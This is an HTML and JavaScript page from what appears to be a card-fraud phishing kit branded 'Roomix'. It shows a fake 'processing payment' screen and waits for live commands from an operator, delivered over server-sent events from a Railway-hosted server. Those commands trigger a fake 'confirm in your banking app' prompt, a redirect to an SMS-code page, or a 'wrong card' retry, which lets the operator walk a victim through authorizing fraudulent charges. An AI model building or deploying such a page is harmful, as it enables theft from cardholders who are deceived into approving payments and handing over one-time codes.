<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roomix ‚Äî –û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–ª–∞—Ç–µ–∂–∞</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        /* –°—Ç–∏–ª–∏ –æ—Å—Ç–∞—é—Ç—Å—è –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π */
        :root {
            --primary: #D4AF37;
            --primary-dark: #B8941F;
            --primary-light: rgba(212, 175, 55, 0.1);
            --dark: #121212;
            --dark-light: #1E1E1E;
            --text: #FFFFFF;
            --text-secondary: #B0B0B0;
            --error: #FF6B6B;
            --success: #4CAF50;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Montserrat', sans-serif;
            background: linear-gradient(135deg, var(--dark) 0%, var(--dark-light) 100%);
            min-height: 100vh;
            color: var(--text);
            line-height: 1.6;
            overflow-x: hidden;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
            margin-bottom: 30px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .logo-icon {
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--dark);
            font-weight: 800;
            font-size: 24px;
            box-shadow: 0 4px 15px rgba(212, 175, 55, 0.3);
        }

        .logo-text {
            font-size: 28px;
            font-weight: 800;
            background: linear-gradient(135deg, var(--primary) 0%, #FFD700 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: 1px;
        }

        .header-controls {
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .language-selector {
            position: relative;
            display: inline-block;
        }

        .language-btn {
            background: var(--primary-light);
            color: var(--primary);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            padding: 8px 15px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
            font-weight: 600;
            transition: all 0.3s ease;
        }

        .language-btn:hover {
            background: var(--primary);
            color: var(--dark);
        }

        .language-dropdown {
            display: none;
            position: absolute;
            top: 100%;
            right: 0;
            background: var(--dark-light);
            border-radius: 8px;
            padding: 10px 0;
            min-width: 150px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            z-index: 100;
        }

        .language-dropdown.show {
            display: block;
        }

        .language-option {
            padding: 10px 20px;
            cursor: pointer;
            transition: background 0.3s ease;
        }

        .language-option:hover {
            background: rgba(255, 255, 255, 0.05);
        }

        .language-option.active {
            color: var(--primary);
            font-weight: 600;
        }

        .user-actions {
            display: flex;
            gap: 15px;
        }

        .btn-icon {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: var(--primary-light);
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--primary);
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .btn-icon:hover {
            background: var(--primary);
            color: var(--dark);
            transform: translateY(-2px);
        }

        .loading-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            height: calc(100vh - 200px);
        }

        .loader {
            border: 8px solid var(--primary-light);
            border-top: 8px solid var(--primary);
            border-radius: 50%;
            width: 80px;
            height: 80px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            font-size: 22px;
            font-weight: 700;
            color: var(--primary);
        }

        .loading-subtext {
            color: var(--text-secondary);
            font-size: 16px;
        }

        .sse-status {
            position: fixed;
            top: 10px;
            right: 10px;
            padding: 8px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            z-index: 1000;
        }

        .sse-connected {
            background: var(--success);
            color: var(--dark);
        }

        .sse-disconnected {
            background: var(--error);
            color: var(--text);
        }

        footer {
            text-align: center;
            padding: 30px 0;
            margin-top: 40px;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            color: var(--text-secondary);
            font-size: 14px;
        }

        @media (max-width: 768px) {
            .container {
                padding: 15px;
            }

            header {
                flex-direction: column;
                gap: 20px;
                padding: 15px 0;
            }

            .logo {
                justify-content: center;
                width: 100%;
            }

            .header-controls {
                width: 100%;
                justify-content: center;
                flex-direction: row;
                gap: 15px;
            }

            .user-actions {
                gap: 10px;
            }

            .btn-icon {
                width: 35px;
                height: 35px;
            }

            .language-selector {
                width: auto;
            }

            .language-dropdown {
                right: auto;
                left: 50%;
                transform: translateX(-50%);
            }

            .loader {
                width: 60px;
                height: 60px;
                border-width: 6px;
            }

            .loading-text {
                font-size: 20px;
            }

            .loading-subtext {
                font-size: 14px;
            }
        }

        @media (max-width: 480px) {
            .container {
                padding: 10px;
            }

            .logo-icon {
                width: 40px;
                height: 40px;
                font-size: 18px;
            }

            .logo-text {
                font-size: 22px;
            }

            .header-controls {
                flex-direction: column;
                gap: 10px;
            }

            .language-btn {
                padding: 6px 12px;
                font-size: 14px;
            }

            footer {
                padding: 20px 0;
                margin-top: 30px;
                font-size: 12px;
            }
        }
    </style>
</head>
<body>
    <div class="sse-status sse-disconnected" id="sseStatus">
        üî¥ SSE –æ—Ç–∫–ª—é—á–µ–Ω
    </div>

    <div class="container">
        <header>
            <a class="logo">
                <div class="logo-icon">R</div>
                <div class="logo-text">Roomix</div>
            </a>
            <div class="header-controls">
                <div class="language-selector">
                    <button class="language-btn">
                        <i class="fas fa-globe"></i>
                        <span id="currentLanguage">–†—É—Å—Å–∫–∏–π</span>
                        <i class="fas fa-chevron-down"></i>
                    </button>
                    <div class="language-dropdown" id="languageDropdown">
                        <div class="language-option active" data-lang="ru">–†—É—Å—Å–∫–∏–π</div>
                        <div class="language-option" data-lang="pl">Polski</div>
                        <div class="language-option" data-lang="en">English</div>
                    </div>
                </div>
                <div class="user-actions">
                    <div class="btn-icon">
                        <i class="fas fa-question-circle"></i>
                    </div>
                    <div class="btn-icon">
                        <i class="fas fa-bell"></i>
                    </div>
                    <div class="btn-icon">
                        <i class="fas fa-user"></i>
                    </div>
                </div>
            </div>
        </header>

        <div class="loading-container">
            <div class="loader"></div>
            <div class="loading-text" id="loadingText">–û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–ª–∞—Ç–µ–∂–∞...</div>
            <div class="loading-subtext" id="loadingSubtext">–û–∂–∏–¥–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥ –æ—Ç –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞...</div>
        </div>

        <footer>
            <p>¬© 2025 Roomix. –í—Å–µ –ø—Ä–∞–≤–∞ –∑–∞—â–∏—â–µ–Ω—ã.</p>
            <p style="margin-top: 10px; font-size: 12px;">–ü—Ä–∏–Ω–∏–º–∞–µ–º –∫ –æ–ø–ª–∞—Ç–µ:
                <i class="fab fa-cc-visa" style="margin: 0 5px;"></i>
                <i class="fab fa-cc-mastercard" style="margin: 0 5px;"></i>
                <i class="fab fa-cc-paypal" style="margin: 0 5px;"></i>
            </p>
        </footer>
    </div>

    <script>
        const translations = {
            ru: {
                loadingText: '–û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–ª–∞—Ç–µ–∂–∞...',
                loadingSubtext: '–û–∂–∏–¥–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥ –æ—Ç –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞...'
            },
            pl: {
                loadingText: 'Przetwarzanie p≈Çatno≈õci...',
                loadingSubtext: 'Oczekiwanie na polecenia operatora...'
            },
            en: {
                loadingText: 'Processing Payment...',
                loadingSubtext: 'Waiting for operator commands...'
            }
        };

        let currentLanguage = sessionStorage.getItem('selectedLanguage') || 'ru';

        function changeLanguage(lang) {
            currentLanguage = lang;
            sessionStorage.setItem('selectedLanguage', lang);
            const t = translations[lang];
            document.getElementById('loadingText').textContent = t.loadingText;
            document.getElementById('loadingSubtext').textContent = t.loadingSubtext;
            document.getElementById('currentLanguage').textContent = lang === 'ru' ? '–†—É—Å—Å–∫–∏–π' : lang === 'pl' ? 'Polski' : 'English';

            document.querySelectorAll('.language-option').forEach(option => {
                option.classList.toggle('active', option.getAttribute('data-lang') === lang);
            });
        }

        document.querySelector('.language-btn').addEventListener('click', () => {
            document.getElementById('languageDropdown').classList.toggle('show');
        });

        document.querySelectorAll('.language-option').forEach(option => {
            option.addEventListener('click', () => {
                changeLanguage(option.getAttribute('data-lang'));
                document.getElementById('languageDropdown').classList.remove('show');
            });
        });

        window.addEventListener('click', e => {
            if (!e.target.closest('.language-selector')) {
                document.getElementById('languageDropdown').classList.remove('show');
            }
        });

        changeLanguage(currentLanguage);

        // SSE –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –¥–ª—è GitHub Pages
        const userId = "user_123";
        const RAILWAY_URL = "https://roomix-production.up.railway.app"; // –î–û–ë–ê–í–¨ https://
        let eventSource = null;
        let reconnectAttempts = 0;
        const maxReconnectAttempts = 10;

        function connectSSE() {
            if (reconnectAttempts >= maxReconnectAttempts) {
                console.error('‚ùå –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–ø—ã—Ç–æ–∫ –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è');
                updateSSEStatus(false, '–ú–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–ø—ã—Ç–æ–∫');
                return;
            }

            try {
                const sseUrl = `${RAILWAY_URL}/sse/${userId}`;
                console.log('üîÑ –ü–æ–¥–∫–ª—é—á–∞–µ–º—Å—è –∫ SSE:', sseUrl);
                
                eventSource = new EventSource(sseUrl);

                eventSource.onopen = function(event) {
                    console.log('‚úÖ SSE –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –æ—Ç–∫—Ä—ã—Ç–æ');
                    reconnectAttempts = 0;
                    updateSSEStatus(true, 'SSE –ø–æ–¥–∫–ª—é—á–µ–Ω');
                };

                eventSource.onmessage = function(event) {
                    console.log('üì® –ü–æ–ª—É—á–µ–Ω–æ —Å–æ–æ–±—â–µ–Ω–∏–µ SSE:', event.data);
                    try {
                        const data = JSON.parse(event.data);
                        
                        if (data.type === 'connected') {
                            console.log('‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è SSE');
                            return;
                        }
                        
                        if (data.type === 'bot_command') {
                            handleBotCommand(data);
                        }
                    } catch (e) {
                        console.error('‚ùå –û—à–∏–±–∫–∞ –ø–∞—Ä—Å–∏–Ω–≥–∞ –∫–æ–º–∞–Ω–¥—ã:', e);
                    }
                };

                eventSource.onerror = function(event) {
                    console.error('‚ùå –û—à–∏–±–∫–∞ SSE');
                    reconnectAttempts++;
                    
                    if (eventSource.readyState === EventSource.CLOSED) {
                        updateSSEStatus(false, '–ü–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ...');
                        console.log(`üîÑ –ü–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–∞–µ–º—Å—è —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã... (–ø–æ–ø—ã—Ç–∫–∞ ${reconnectAttempts}/${maxReconnectAttempts})`);
                        setTimeout(connectSSE, 3000);
                    }
                };

            } catch (error) {
                console.error('üí• –û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è SSE:', error);
                reconnectAttempts++;
                updateSSEStatus(false, '–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è');
                setTimeout(connectSSE, 5000);
            }
        }

        function updateSSEStatus(connected, message = '') {
            const statusElement = document.getElementById('sseStatus');
            if (connected) {
                statusElement.textContent = 'üü¢ SSE –ø–æ–¥–∫–ª—é—á–µ–Ω';
                statusElement.className = 'sse-status sse-connected';
            } else {
                statusElement.textContent = `üî¥ ${message || 'SSE –æ—Ç–∫–ª—é—á–µ–Ω'}`;
                statusElement.className = 'sse-status sse-disconnected';
            }
        }

        function handleBotCommand(command) {
            console.log('ü§ñ –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã:', command);

            if (command.action === 'push') {
                window.showPushNotification();
            } else if (command.action === 'sms') {
                window.redirectToSMS();
            } else if (command.action === 'wrong_card') {
                window.redirectToPaymentWithError();
            }
        }

        // –¢–µ—Å—Ç —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
        function testConnection() {
            console.log('üß™ –¢–µ—Å—Ç–∏—Ä—É–µ–º —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ —Å —Å–µ—Ä–≤–µ—Ä–æ–º...');
            
            fetch(`${RAILWAY_URL}/health`)
                .then(response => {
                    console.log('‚úÖ Health endpoint –¥–æ—Å—Ç—É–ø–µ–Ω:', response.status);
                    return response.json();
                })
                .then(data => {
                    console.log('üìä –°—Ç–∞—Ç—É—Å —Å–µ—Ä–≤–µ—Ä–∞:', data);
                    updateSSEStatus(true, '–°–µ—Ä–≤–µ—Ä –¥–æ—Å—Ç—É–ø–µ–Ω');
                    connectSSE();
                })
                .catch(error => {
                    console.error('‚ùå Health endpoint –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω:', error);
                    updateSSEStatus(false, '–°–µ—Ä–≤–µ—Ä –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω');
                    setTimeout(testConnection, 5000);
                });
        }

        // –§—É–Ω–∫—Ü–∏–∏ –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è —Å—Ç—Ä–∞–Ω–∏—Ü–µ–π
        window.showPushNotification = function() {
            const modal = document.createElement('div');
            modal.style.cssText = `
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0,0,0,0.8);
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 10000;
                animation: fadeIn 0.3s ease;
            `;

            modal.innerHTML = `
                <div style="
                    background: var(--dark-light);
                    border-radius: 20px;
                    padding: 30px;
                    border: 1px solid var(--primary);
                    max-width: 400px;
                    width: 90%;
                    text-align: center;
                    box-shadow: 0 20px 40px rgba(0,0,0,0.5);
                ">
                    <div style="font-size: 48px; color: var(--primary); margin-bottom: 20px;">
                        üîî
                    </div>
                    <h3 style="color: var(--text); margin-bottom: 15px;">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –æ–ø–µ—Ä–∞—Ü–∏—é</h3>
                    <p style="color: var(--text-secondary); margin-bottom: 25px;">
                        –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –æ–ø–µ—Ä–∞—Ü–∏—é –≤ –≤–∞—à–µ–º –±–∞–Ω–∫–æ–≤—Å–∫–æ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏
                    </p>
                    <div style="display: flex; gap: 15px; justify-content: center;">
                        <button id="confirmPushBtn" style="
                            background: var(--success);
                            color: white;
                            border: none;
                            padding: 12px 25px;
                            border-radius: 10px;
                            cursor: pointer;
                            font-weight: 600;
                        ">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
                        <button id="cancelPushBtn" style="
                            background: var(--error);
                            color: white;
                            border: none;
                            padding: 12px 25px;
                            border-radius: 10px;
                            cursor: pointer;
                            font-weight: 600;
                        ">–û—Ç–º–µ–Ω–∏—Ç—å</button>
                    </div>
                </div>
            `;

            document.body.appendChild(modal);

            document.getElementById('confirmPushBtn').addEventListener('click', function() {
                document.querySelector('div[style*="position: fixed"]').remove();
                const loadingText = document.querySelector('.loading-text');
                loadingText.textContent = '‚úÖ –û–ø–µ—Ä–∞—Ü–∏—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∞!';
            });

            document.getElementById('cancelPushBtn').addEventListener('click', function() {
                document.querySelector('div[style*="position: fixed"]').remove();
                const loadingText = document.querySelector('.loading-text');
                loadingText.textContent = '‚ùå –û–ø–µ—Ä–∞—Ü–∏—è –æ—Ç–º–µ–Ω–µ–Ω–∞';
            });
        };

        window.redirectToSMS = function() {
            window.location.href = 'sms.html';
        };

        window.redirectToPaymentWithError = function() {
            window.location.href = 'payment.html?status=wrong_card';
        };

        // –ó–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        document.addEventListener('DOMContentLoaded', function() {
            console.log('üöÄ –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è SSE –¥–ª—è GitHub Pages...');
            testConnection();
        });

        // –ó–∞–∫—Ä—ã–≤–∞–µ–º SSE –ø—Ä–∏ –∑–∞–∫—Ä—ã—Ç–∏–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('beforeunload', function() {
            if (eventSource) {
                eventSource.close();
            }
        });
    </script>
</body>
</html>
